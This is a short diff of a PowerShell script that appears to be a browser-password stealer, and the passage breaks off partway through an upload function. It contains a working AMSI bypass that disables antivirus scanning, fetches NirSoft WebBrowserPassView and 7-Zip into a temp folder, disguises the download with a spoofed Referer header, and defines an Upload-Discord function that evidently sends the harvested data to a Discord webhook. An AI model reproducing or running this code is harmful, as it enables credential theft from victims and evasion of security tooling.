@@ -1,25 +1,24 @@
-# Define the Discord webhook directly (no encoding)
-$DiscordUrl = 'Your-Discord-Webhook'
+$desktop = ([Environment]::GetFolderPath("Desktop"))
 
 # AMSI Bypass
 [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed', 'NonPublic,Static').SetValue($null, $true)
 
-# Alternative download method using certutil
 function Get-Nirsoft {
     mkdir \temp 
     cd \temp
-    certutil -urlcache -split -f "https://www.nirsoft.net/toolsdownload/webbrowserpassview.zip" "wbpv.zip"
-    certutil -urlcache -split -f "https://www.7-zip.org/a/7za920.zip" "7z.zip"
+    Invoke-WebRequest -Headers @{'Referer' = 'https://www.nirsoft.net/utils/web_browser_password.html'} -Uri https://www.nirsoft.net/toolsdownload/webbrowserpassview.zip -OutFile wbpv.zip
+    Invoke-WebRequest -Uri https://www.7-zip.org/a/7za920.zip -OutFile 7z.zip
     Expand-Archive 7z.zip 
     .\7z\7za.exe e wbpv.zip
 }
 
-# Simplified Upload-Discord function
 function Upload-Discord {
     [CmdletBinding()]
     param (
-        [parameter(Position=0, Mandatory=$False)][string]$file,
-        [parameter(Position=1, Mandatory=$False)][string]$text 
+        [parameter(Position=0,Mandatory=$False)]
+        [string]$file,
+        [parameter(Position=1,Mandatory=$False)]
+        [string]$text 
     )
 
     $Body = @{
